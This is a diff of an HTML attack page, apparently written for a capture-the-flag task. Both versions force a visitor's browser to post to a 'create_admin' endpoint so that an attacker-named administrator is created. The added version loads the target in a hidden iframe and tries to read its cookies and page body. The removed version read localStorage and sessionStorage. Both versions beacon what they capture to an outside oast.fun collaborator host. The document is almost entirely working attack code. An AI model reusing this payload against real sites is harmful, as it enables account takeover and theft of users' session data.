@@ -1,36 +1,48 @@
 <!DOCTYPE html>
-<form method="POST" action="https://tasks.goidactf.ru:20499/create_admin" target="_blank">
-    <input type="hidden" name="new_admin_login" value="HACKED_BY_BOT">
+<html>
+<body>
+<iframe id="targetFrame" src="https://tasks.goidactf.ru:20499/create_admin" 
+        style="display:none"></iframe>
+
+<form id="hackForm" method="POST" target="targetFrame">
+    <input type="hidden" name="new_admin_login" value="HACKED_FRAME">
 </form>
+
 <script>
-// Форма отправит куки автоматически
-document.forms[0].submit();
+const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
+const iframe = document.getElementById('targetFrame');
 
-// Пробуем также через fetch с credentials
-setTimeout(() => {
-    fetch('https://tasks.goidactf.ru:20499/create_admin', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-        credentials: 'include', // Отправляет куки сессии
-        mode: 'no-cors', // Чтобы избежать CORS ошибок при отправке
-        body: 'new_admin_login=FETCH_ADMIN'
-    });
-}, 500);
+// Ждём загрузки iframe
+iframe.onload = function() {
+    // Отправляем форму в iframe
+    document.getElementById('hackForm').submit();
+    
+    // Через 3 секунды пытаемся прочитать iframe
+    setTimeout(() => {
+        try {
+            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+            const cookies = iframeDoc.cookie || iframe.contentWindow.document.cookie;
+            const body = iframeDoc.body.innerHTML;
+            
+            // Отправляем что нашли
+            new Image().src = `${COLLAB}/?iframe_cookies=${encodeURIComponent(cookies)}`;
+            new Image().src = `${COLLAB}/?iframe_body_len=${body.length}`;
+            
+            // Если в теле есть кука или токен
+            if (body.includes('admin_login') || body.includes('token') || body.includes('auth')) {
+                new Image().src = `${COLLAB}/?contains_creds=yes`;
+            }
+        } catch(e) {
+            new Image().src = `${COLLAB}/?iframe_error=${encodeURIComponent(e.message)}`;
+        }
+    }, 3000);
+};
 
-// Проверяем, какие куки вообще есть
-setTimeout(() => {
-    // Отправляем сигнал о том что скрипт выполнился
-    new Image().src = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/?script_executed=yes';
-    
-    // Пробуем прочитать localStorage/sessionStorage на всякий случай
-    try {
-        const ls = JSON.stringify(localStorage);
-        new Image().src = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/?localStorage=' + encodeURIComponent(ls.substring(0, 1000));
-    } catch(e) {}
-    
-    try {
-        const ss = JSON.stringify(sessionStorage);
-        new Image().src = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/?sessionStorage=' + encodeURIComponent(ss.substring(0, 1000));
-    } catch(e) {}
-}, 2000);
+// Также вешаем обработчик на postMessage
+window.addEventListener('message', function(event) {
+    // Если iframe отправит нам сообщение
+    new Image().src = `${COLLAB}/?postmessage=${encodeURIComponent(JSON.stringify(event.data))}`;
+});
 </script>
+</body>
+</html>
